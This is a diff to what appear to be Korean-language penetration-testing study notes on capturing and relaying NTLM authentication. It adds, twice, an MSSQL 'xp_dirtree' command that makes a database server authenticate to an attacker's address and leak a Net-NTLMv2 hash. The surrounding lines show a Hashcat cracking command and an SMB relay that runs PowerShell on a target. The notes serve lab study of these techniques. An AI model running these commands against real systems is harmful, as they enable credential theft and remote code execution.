@@ -147,6 +147,11 @@ dir \\192.168.119.2\test
 - 피해자 시스템에서 네트워크 공유 경로에 접근하게 하여 인증 절차를 유도
 - 이 과정에서 NTLM 인증이 발생하며, Responder가 해시를 가로챔
 
+```sql
+# MSSQL Get Net-NTLMv2
+EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
+```
+
 ### Hashcat으로 크래킹
 ```bash
 hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
@@ -178,6 +183,11 @@ dir \\192.168.119.2\test
 - 피해자 시스템에서 네트워크 공유에 접근하게 하여 SMB 인증을 유도
 - 인증 요청은 공격자의 시스템을 거쳐 릴레이 타겟으로 전달됨
 - 인증이 성공하면 지정한 PowerShell 명령이 타겟에서 실행됨
+
+```sql
+# MSSQL Get Net-NTLMv2
+EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
+```
 
 ---
 
